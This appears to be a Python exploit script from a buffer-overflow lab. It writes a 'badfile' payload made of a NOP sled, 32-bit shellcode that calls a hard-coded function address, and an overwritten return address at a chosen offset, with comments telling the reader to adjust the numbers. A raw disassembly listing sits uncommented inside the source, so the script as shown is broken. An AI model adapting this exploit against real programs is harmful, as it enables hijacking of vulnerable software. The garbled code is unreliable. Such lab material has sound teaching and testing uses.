#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
   "\x31\xc9\x31\xc0\xb0\x01\xb1\x06\x51\x50\xbb\x86\x62\x55\x56\xff"
   "\xd3\x31\xc9\x51\x50\xff\xd3\xb1\x05\x51\x50\xff\xd3\x31\xc9\x51"
   "\x50\xff\xd3\x31\xc9\x51\x50\xff\xd3\xb1\x01\x51\x50\xff\xd3"
).encode('latin-1')

0:  31 c9                   xor    ecx,ecx
2:  31 c0                   xor    eax,eax
4:  b0 01                   mov    al,0x1
6:  b1 06                   mov    cl,0x6
8:  51                      push   ecx
9:  50                      push   eax
a:  bb 86 62 55 56          mov    ebx,0x56556286
f:  ff d3                   call   ebx
11: 31 c9                   xor    ecx,ecx
13: 51                      push   ecx
14: 50                      push   eax
15: ff d3                   call   ebx
17: b1 05                   mov    cl,0x5
19: 51                      push   ecx
1a: 50                      push   eax
1b: ff d3                   call   ebx
1d: 31 c9                   xor    ecx,ecx
1f: 51                      push   ecx
20: 50                      push   eax
21: ff d3                   call   ebx
23: 31 c9                   xor    ecx,ecx
25: 51                      push   ecx
26: 50                      push   eax
27: ff d3                   call   ebx
29: b1 01                   mov    cl,0x1
2b: 51                      push   ecx
2c: 50                      push   eax
2d: ff d3                   call   ebx

# Fill the content with NOP's
content = bytearray(0x90 for i in range(2197)) 

##################################################################
# Put the shellcode somewhere in the payload
start = 2197 - len(shellcode)              # Change this number 
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
ret    = 0xffffcd38   + 0x482   # Change this number 
offset = 989              	# Change this number 

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address

content[offset : offset + L] = (ret).to_bytes(L,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
